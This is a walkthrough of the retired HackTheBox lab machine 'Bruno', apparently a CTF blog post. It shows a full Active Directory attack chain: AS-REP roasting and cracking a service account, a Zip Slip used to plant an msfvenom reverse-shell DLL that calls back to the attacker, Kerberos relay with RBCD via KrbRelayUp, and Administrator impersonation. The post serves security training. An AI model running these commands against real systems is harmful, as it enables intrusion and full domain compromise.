---
title: Bruno
summary: "Full walkthrough of the retired machine Bruno from HackTheBox"
date: 2026-04-16
tag: htb-machines
---


# Enumeration 
## `nmap` scan 

```bash
$ nmap 10.129.238.9 -Pn -oN scan_ports -p-
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-04-09 11:38 CDT
Nmap scan report for 10.129.238.9
Host is up (0.070s latency).
Not shown: 65511 filtered tcp ports (no-response)
PORT      STATE SERVICE
21/tcp    open  ftp
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
443/tcp   open  https
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
3389/tcp  open  ms-wbt-server
5985/tcp  open  wsman
9389/tcp  open  adws
49152/tcp open  unknown
49153/tcp open  unknown
49664/tcp open  unknown
49668/tcp open  unknown
64421/tcp open  unknown
64426/tcp open  unknown
64559/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 105.93 seconds

$ nmap 10.129.238.9 -Pn -oN scan_service -p21,53,80,88,135,139,389,443,445,464,593,636,3268,3269,3389,5985,9389,49152,49153,49664,49668,64421,64426,64559 -sV -sC 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-04-09 11:42 CDT
Stats: 0:00:27 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 70.83% done; ETC: 11:43 (0:00:11 remaining)
Stats: 0:00:31 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 70.83% done; ETC: 11:43 (0:00:13 remaining)
Nmap scan report for 10.129.238.9
Host is up (0.071s latency).

PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
| ftp-anon: c FTP login allowed (FTP code 230)
| 06-29-22  04:55PM       <DIR>          app
| 06-29-22  04:33PM       <DIR>          benign
| 06-29-22  01:41PM       <DIR>          malicious
|_06-29-22  04:33PM       <DIR>          queue
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-04-09 16:43:04Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: bruno.vl0., Site: Default-First-Site-Name)
|_ssl-date: 2026-04-09T16:44:39+00:00; -1s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:brunodc.bruno.vl, DNS:bruno.vl, DNS:BRUNO
| Not valid before: 2025-10-09T09:54:08
|_Not valid after:  2105-10-09T09:54:08
443/tcp   open  ssl/http      Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| tls-alpn: 
|_  http/1.1
| ssl-cert: Subject: commonName=bruno-BRUNODC-CA
| Not valid before: 2022-06-29T13:23:01
|_Not valid after:  2121-06-29T13:33:00
|_http-title: IIS Windows Server
|_ssl-date: TLS randomness does not represent time
| http-methods: 
|_  Potentially risky methods: TRACE
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap
|_ssl-date: 2026-04-09T16:44:39+00:00; -1s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:brunodc.bruno.vl, DNS:bruno.vl, DNS:BRUNO
| Not valid before: 2025-10-09T09:54:08
|_Not valid after:  2105-10-09T09:54:08
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: bruno.vl0., Site: Default-First-Site-Name)
|_ssl-date: 2026-04-09T16:44:39+00:00; -1s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:brunodc.bruno.vl, DNS:bruno.vl, DNS:BRUNO
| Not valid before: 2025-10-09T09:54:08
|_Not valid after:  2105-10-09T09:54:08
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: bruno.vl0., Site: Default-First-Site-Name)
|_ssl-date: 2026-04-09T16:44:39+00:00; -1s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:brunodc.bruno.vl, DNS:bruno.vl, DNS:BRUNO
| Not valid before: 2025-10-09T09:54:08
|_Not valid after:  2105-10-09T09:54:08
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2026-04-09T16:44:39+00:00; -1s from scanner time.
| ssl-cert: Subject: commonName=brunodc.bruno.vl
| Not valid before: 2026-04-08T15:29:45
|_Not valid after:  2026-10-08T15:29:45
| rdp-ntlm-info: 
|   Target_Name: BRUNO
|   NetBIOS_Domain_Name: BRUNO
|   NetBIOS_Computer_Name: BRUNODC
|   DNS_Domain_Name: bruno.vl
|   DNS_Computer_Name: brunodc.bruno.vl
|   DNS_Tree_Name: bruno.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2026-04-09T16:43:59+00:00
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49152/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49153/tcp open  msrpc         Microsoft Windows RPC
49664/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
64421/tcp open  msrpc         Microsoft Windows RPC
64426/tcp open  msrpc         Microsoft Windows RPC
64559/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: BRUNODC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2026-04-09T16:44:02
|_  start_date: N/A
|_clock-skew: mean: -1s, deviation: 0s, median: -1s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 103.98 seconds

```

- domain : `bruno.vl`
- host : `brunodc.bruno.vl`
- there is FTP, SMB, LDAP/S, kerberos open ports 

## FTP port 

- based on NMAP output, we have anonymous login, we can confirm this using `netexec`

```bash
$ nxc ftp $IP -u '' -p ''
FTP         10.129.238.9    21     10.129.238.9     [*] Banner: Microsoft FTP Service
FTP         10.129.238.9    21     10.129.238.9     [+] : - Anonymous Login!
```

- access to FTP 

```bash
$ ftp ftp://anonymous:anonymous@$IP
```

![](/images/posts/Bruno_000663.png)

there are 4 folders 

- I use the following command to install all files 

```bash
wget -m --no-passive ftp://anonymous:anonymous@$IP
```

- the files 

```bash
├── app
│   ├── changelog
│   ├── packages-microsoft-prod.deb
│   ├── SampleScanner.deps.json
│   ├── SampleScanner.dll
│   ├── SampleScanner.exe
│   ├── SampleScanner.runtimeconfig.dev.json
│   └── SampleScanner.runtimeconfig.json
├── benign
│   └── test.exe
├── malicious
└── queue
```

- there is a exe file of an app, I'll use dotPeek to decompile `SampleScanner.exe`

```cpp
using System.Collections.Generic;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Text;

#nullable disable
namespace SampleScanner;

internal class Program
{
  public static IEnumerable<int> PatternAt(byte[] source, byte[] pattern)
  {
    for (int i = 0; i < source.Length; ++i)
    {
      if (((IEnumerable<byte>) source).Skip<byte>(i).Take<byte>(pattern.Length).SequenceEqual<byte>((IEnumerable<byte>) pattern))
        yield return i;
    }
  }

  private static void Main(string[] args)
  {
    string str = "X5O!P%@AP[4\\PZX54(P^)7CC)7}$EYCAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*";
    str.Replace("EYCAR", "EICAR");
    byte[] bytes = Encoding.ASCII.GetBytes(str);
    foreach (string file in Directory.GetFiles("C:\\samples\\queue\\", "*", SearchOption.AllDirectories))
    {
      if (file.EndsWith(".zip"))
      {
        using (ZipArchive zipArchive = ZipFile.OpenRead(file))
        {
          foreach (ZipArchiveEntry entry in zipArchive.Entries)
          {
            string destinationFileName = Path.Combine("C:\\samples\\queue\\", entry.FullName);
            entry.ExtractToFile(destinationFileName);
          }
          File.Delete(file);
        }
      }
      else if (Program.PatternAt(File.ReadAllBytes(file), bytes).Any<int>())
      {
        File.Copy(file, file.Replace("queue", "malicious"), true);
        File.Delete(file);
      }
      else
      {
        File.Copy(file, file.Replace("queue", "benign"), true);
        File.Delete(file);
      }
    }
  }
}

```

this is a simple basic antivirus app 

- `app/changelog` file shows an automation account `svc_scan`

```bash
$ cat changelog
Version 0.3
- integrated with dev site
- automation using svc_scan

Version 0.2
- additional functionality

Version 0.1
- initial support for EICAR string
```

## AS-REP roasting attack 

- the user `svc_scan` is vulnerable to ASREP roasting attack  

```bash 
$ nxc ldap 10.129.238.9 -u svc_scan -p '' -k
SMB         10.129.238.9    445    BRUNODC          [*] Windows Server 2022 Build 20348 x64 (name:BRUNODC) (domain:bruno.vl) (signing:True) (SMBv1:False)
LDAP        10.129.238.9    389    BRUNODC          [+] bruno.vl\svc_scan account vulnerable to asreproast attack
```

- get hash 

```bash
$ impacket-GetNPUsers -dc-ip $IP bruno.vl/'svc_scan: ' -format john -outputfile hash
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Cannot authenticate svc_scan, getting its TGT                                                                                                /usr/share/doc/python3-impacket/examples/GetNPUsers.py:165: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for remova
l in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
now = datetime.datetime.utcnow() + datetime.timedelta(days=1)
$krb5asrep$svc_scan@BRUNO.VL:7e098de1e357aa8a14f52d465acd9c19$0778865040c8d97bdc853659a983ee31e1746815564e788b28f30da88b4b500e59d5287ede90494c1c4bdcd93cd4465349e70e0926c1ee34d265402ca71fd5605683d4ee1704dc7c81be47049b7c5b0faa23aecf49a85ae8079e94a31cb89bb888ffc78f5113130a261d1063f48702c45189ed41565d5180bba4520a66b8a93d964beeec21079ad824c8ec7e7a06719f966210e3a7f3581719830e0095ba342bbcfd68b4df879b65c89f96ed925c4627ec1746b5785cba3f723df
a5f87241d74088bd0b427ce4d2e438b0d5197c28c9391d2c62f7e9dc053a0cd7aa5b52770238223d3d0

$ nxc ldap 10.129.238.9 -u svc_scan -p '' --asreproast output.txt
SMB         10.129.238.9    445    BRUNODC          [*] Windows Server 2022 Build 20348 x64 (name:BRUNODC) (domain:bruno.vl) (signing:True) (SMBv
1:False)
LDAP        10.129.238.9    445    BRUNODC          $krb5asrep$23$svc_scan@BRUNO.VL:b48349e09230a034a4343754f66c6e82$e26a86d54ba1a1c14818a275cb18
615b1cd6b328641169a4eeab3f46337da5addfe29ff94be5e5da3e308632db9b6b710be28e3cf21e8e12a068b599c7024e5de9ee3feb2570cbcde8d5d25aece3cf85d8ce0df35123b
0310430d0b0b88bb097b72e79a16c67921f43dcae5a6bf8d0651c9c1281118df18e568951cae6d1dfee1418a3e81d4b57d107627cd1ac70fe9b9b4f71de80b8a4df7f8441a39d9f11
9ce71f2b202fcca49c5f99ce6f93a8fa61b60c79a17f142f85497e1acaa89985b4a18b024cb3913af612971090c2be4cbcd6c0688442be61590fdb54bbf70bfe9aa57ad75c
```

![](/images/posts/Bruno_000664.png)

- crack the hash 

```bash
john -format=krb5asrep -w=/usr/share/wordlists/rockyou.txt output.txt
```

![](/images/posts/Bruno_000665.png)

>[!success] svc_scan password 
>Sunshine1

```bash
$ nxc smb $IP -u svc_scan -p Sunshine1
SMB         10.129.238.9    445    BRUNODC          [*] Windows Server 2022 Build 20348 x64 (name:BRUNODC) (domain:bruno.vl) (signing:True) (SMBv1:False)
SMB         10.129.238.9    445    BRUNODC          [+] bruno.vl\svc_scan:Sunshine1

$ nxc winrm 10.129.20.6 -u svc_scan -p Sunshine1
WINRM       10.129.20.6     5985   BRUNODC          [*] Windows Server 2022 Build 20348 (name:BRUNODC) (domain:bruno.vl)
WINRM       10.129.20.6     5985   BRUNODC          [-] bruno.vl\svc_scan:Sunshine1
```

## SMB shares 

- using this new creds, I can enumerate SMB shares 

```bash
nxc smb $IP -u svc_scan -p Sunshine1 --shares
```

![](/images/posts/Bruno_000666.png)

There are 2 no default shares `CertEnroll` and `queue`. We have permission to read `CertEnroll` share and read, write permission for `queue` share 

- I use `impacket-smbclient` to see what we have

```bash
impacket-smbclient burno.vl/'svc_scan:Sunshine1'@$IP
```

- in `CertEnroll` there are CA certificates

```bash
# use CertEnroll
# ls
drw-rw-rw-          0  Fri Apr 10 15:34:47 2026 .
drw-rw-rw-          0  Wed Jun 29 14:33:04 2022 ..
-rw-rw-rw-        731  Fri Apr 10 15:34:47 2026 bruno-BRUNODC-CA(1)+.crl
-rw-rw-rw-        925  Fri Apr 10 15:34:47 2026 bruno-BRUNODC-CA(1).crl
-rw-rw-rw-        726  Fri Apr 10 15:34:47 2026 bruno-BRUNODC-CA+.crl
-rw-rw-rw-        917  Fri Apr 10 15:34:47 2026 bruno-BRUNODC-CA.crl
-rw-rw-rw-       1367  Thu Oct  9 11:04:08 2025 brunodc.bruno.vl_bruno-BRUNODC-CA(0-1).crt
-rw-rw-rw-        916  Thu Oct  9 11:04:08 2025 brunodc.bruno.vl_bruno-BRUNODC-CA(1).crt
-rw-rw-rw-       1372  Thu Oct  9 11:04:08 2025 brunodc.bruno.vl_bruno-BRUNODC-CA(1-0).crt
-rw-rw-rw-        877  Wed Jun 29 14:33:01 2022 brunodc.bruno.vl_bruno-BRUNODC-CA.crt
-rw-rw-rw-        325  Wed Jun 29 14:33:04 2022 nsrev_bruno-BRUNODC-CA.asp
```

- the `queue` is empty 

```bash
# use queue
# ls
drw-rw-rw-          0  Fri Apr 10 18:40:34 2026 .
drw-rw-rw-          0  Wed Jun 29 14:41:03 2022 ..
```

Going back to the binary we found earlier in FTP server, and combining this with having write access to the queue share
the app does : 
- Scans `C:\samples\queue\` for files 
- Extracts ZIP files automatically
- Sorts files into malicious or benign folders based on signature 
## Zip Slip 

- If the there is zip file, the app extract the files directly from the ZIP file without validation

```cpp
if (file.EndsWith(".zip"))
      {
        using (ZipArchive zipArchive = ZipFile.OpenRead(file))
        {
          foreach (ZipArchiveEntry entry in zipArchive.Entries)
          {
            string destinationFileName = Path.Combine("C:\\samples\\queue\\", entry.FullName);
            entry.ExtractToFile(destinationFileName);
          }
          File.Delete(file);
        }
      }
```

>[!info]
>**Zip Slip** is a vulnerability that occurs when a program extracts ZIP files **without validating file paths**, allowing an attacker to write files **outside the intended directory**.
### verify the vulnerability 

- i use the zip file as POC of this vulnerability 

```bash
$ python3
Python 3.13.5 (main, Jun 25 2025, 18:55:22) [GCC 14.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> import zipfile
>>> with zipfile.ZipFile('test.zip','w') as file:
...     file.writestr('../app/hi.txt', 'Hi, i test u ')
...
```

- I'll upload this to SMB queue share 

```bash
$ impacket-smbclient 'bruno.vl/svc_scan:Sunshine1'@$IP
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

Type help for list of commands
# use queue
# ls
drw-rw-rw-          0  Fri Apr 10 18:40:34 2026 .
drw-rw-rw-          0  Wed Jun 29 14:41:03 2022 ..
# put test.zip
# ls
drw-rw-rw-          0  Fri Apr 10 20:18:44 2026 .
drw-rw-rw-          0  Wed Jun 29 14:41:03 2022 ..
-rw-rw-rw-        137  Fri Apr 10 20:18:44 2026 test.zip
```

- after that we can find hi.txt in app 

![](/images/posts/Bruno_000669.png)

### DLL hijack

- Now, we need to find what dll's the program is using so we can replace them with a malicious .dll. We can use Process Monitor and et filters for SampleScanner.exe

![](/images/posts/Bruno_000667.png)

- run `SampleScanner.exe` 

```powershell
PS C:\Users\pc\Desktop\10.129.238.9\app> ls


    Directory: C:\Users\pc\Desktop\10.129.238.9\app


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         6/29/2022   5:42 PM            165 changelog
-a----         6/28/2022   7:15 PM            431 SampleScanner.deps.json
-a----         6/29/2022   3:58 PM           7168 SampleScanner.dll
-a----         6/29/2022   3:58 PM         174592 SampleScanner.exe
-a----         6/28/2022   7:15 PM            170 SampleScanner.runtimeconfig.dev.json
-a----         6/28/2022   7:15 PM            154 SampleScanner.runtimeconfig.json

PS C:\Users\pc\Desktop\10.129.238.9\app> .\SampleScanner.exe
```

- In process monitor we got `hostfxr.dll` files that are searched for in the application directory are called first but it says the file not found

![](/images/posts/Bruno_000668.png)

so, we  can create a malicious DLL file called `hostfxr.dll` and put it in app folder using Zip split vulnerability 

- create malicious DLL 

```bash
$ msfvenom -p windows/x64/shell_reverse_tcp lhost=10.10.14.144 lport=4444 -f dll > hostfxr.dll
```

- create zip file 

```bash
$ python3
Python 3.13.5 (main, Jun 25 2025, 18:55:22) [GCC 14.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> import zipfile
>>> with zipfile.ZipFile('exploit.zip','w') as file:
...     file.writestr('../app/hostfxr.dll', open('hostfxr.dll', 'rb').read())
```

- upload it to SMB 

```bash
$ impacket-smbclient 'bruno.vl/svc_scan:Sunshine1'@$IP
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

Type help for list of commands
# use queue
# put exploit.zip
```

- After a while the connection is made 

```bash
$ sudo rlwrap -cAr nc -lnvp 443
[sudo] password for oxmg:
Listening on 0.0.0.0 443
Connection received on 10.129.18.169 62899
Microsoft Windows [Version 10.0.20348.768]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
bruno\svc_scan

C:\Windows\system32>
```

- we can switch to Powershell 

```bash
C:\Windows\system32>powershell
powershell
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\svc_scan> cat Desktop/user.txt
cat Desktop/user.txt
fa9d11b10570ec0bb796916c9238abe1
```

# Post-exploitation 

- LDAP signing is not enforced and no LDAPS channel binding 

```bash
$ nxc ldap $IP -u svc_scan -p Sunshine1 -M ldap-checker
SMB         10.129.20.6     445    BRUNODC          [*] Windows Server 2022 Build 20348 x64 (name:BRUNODC) (domain:bruno.vl) (signing:True) (SMBv1:False)
LDAP        10.129.20.6     389    BRUNODC          [+] bruno.vl\svc_scan:Sunshine1 
LDAP-CHE... 10.129.20.6     389    BRUNODC          LDAP Signing NOT Enforced!
LDAP-CHE... 10.129.20.6     389    BRUNODC          LDAPS Channel Binding is set to "NEVER"
```

- We have permission to create computer account 

```bash
$ nxc ldap $IP -u svc_scan -p Sunshine1 -M maq
SMB         10.129.20.6     445    BRUNODC          [*] Windows Server 2022 Build 20348 x64 (name:BRUNODC) (domain:bruno.vl) (signing:True) (SMBv1:False)
LDAP        10.129.20.6     389    BRUNODC          [+] bruno.vl\svc_scan:Sunshine1 
MAQ         10.129.20.6     389    BRUNODC          [*] Getting the MachineAccountQuota
MAQ         10.129.20.6     389    BRUNODC          MachineAccountQuota: 10
```

## Kerberos relay with RBCD attack 

Adding a machine to the domain provides an account with a service principal name (SPN) that I control, which will be useful for relay attacks.
to perform Kerberos relay attack, I'll use the DCOM OXID resolver to coerce authentication via Kerberos as the local machine’s SYSTEM account

- add `0xmg$` computer account 

```bash
$ bloodyAD -u svc_scan -p Sunshine1 -d bruno.vl --host $IP add computer 0xmg '$1230Xmg'
[+] 0xmg$ created
```

- I'll use [Checkerv2.0.exe](https://github.com/CICADA8-Research/RemoteKrbRelay) to find CLSIDs 

```powershell
PS C:\Users\svc_scan> .\Checkerv2.0.exe

                            /\_/\____,          /\     /\
                  ,___/\_/\ \  ~     /            \ _____\
                  \     ~  \ )   XXX               (_)-(_)
                    XXX     /    /\_/\___,      Checkerv2.0 Collection
                       \o-o/-o-o/   ~    /
                        ) /     \    XXX
                       _|    / \ \_/
                    ,-/   _  \_/   \
                   / (   /____,__|  )
                  (  |_ (    )  \) _|
                 _/ _)   \   \__/   (_
                (,-(,(,(,/      \,),),)

                CICADA8 Research Team
                From Michael Zhmaylo (MzHmO)

[?] You didn't specify anything. Look Checker.exe -h
[+] Result will be in Output, format csv
[+] Success
```

- there is `CertSrv Request` COM class 

```bash
{D99E6E74-FC88-11D0-B498-00A0C90312F3}	CertSrv Request	The Launching User	LocalActivation. RemoteActivation	AccessAllowed	Everyone	S-1-1-0	LocalAccess. RemoteAccess	AccessAllowed	Everyone	S-1-1-0		
```

- I'll use [KrbRelayUp.exe](https://github.com/Dec0ne/KrbRelayUp) to automate attack 

```powershell
PS C:\Users\svc_scan\KrbRelayUp.exe> .\KrbRelayUp.exe relay -m rbcd -cls D99E6E74-FC88-11D0-B498-00A0C90312F3 --ComputerName 0xmg$ --ComputerPassword '$1230Xmg'
.\KrbRelayUp.exe relay -m rbcd -cls D99E6E74-FC88-11D0-B498-00A0C90312F3 --ComputerName 0xmg$ --ComputerPassword '$1230Xmg'
KrbRelayUp - Relaying you to SYSTEM


[+] Rewriting function table
[+] Rewriting PEB
[+] Init COM server
[+] Looking for available ports..
[+] Port 10246 available
[+] Register COM server
[+] Forcing SYSTEM authentication
[+] Got Krb Auth from NT/SYSTEM. Relying to LDAP now...
[+] LDAP session established
[+] RBCD rights added successfully
[+] Run the spawn method for SYSTEM shell:
./KrbRelayUp.exe spawn -m rbcd -d bruno.vl -dc brunodc.bruno.vl -cn 0xmg$ -cp $1230Xmg
```

> this tool coerce Kerberos auth from local machine account, relay it to LDAP and create a control primitive over the local machine using RBCD

- get service ticket and impersonate Administrator on the DC. we should use SPN HTTP to use it with WINRM 

```bash
$ impacket-getST bruno.vl/'0xmg$:$1230Xmg' -spn HTTP/brunodc.bruno.vl -impersonate Administrator
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating Administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in Administrator@HTTP_brunodc.bruno.vl@BRUNO.VL.ccache
```

- get shell as Administrator 

```bash
$ KRB5CCNAME="$(pwd)/Administrator@HTTP_brunodc.bruno.vl@BRUNO.VL.ccache" evil-winrm -r bruno.vl -i brunodc.bruno.vl

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
bruno\administrator
*Evil-WinRM* PS C:\Users\Administrator\Documents> cat ..\Desktop\root.txt
1ef5838cb3bc23bd6546dcc286797157
```

![](/images/posts/Bruno_000689.png)
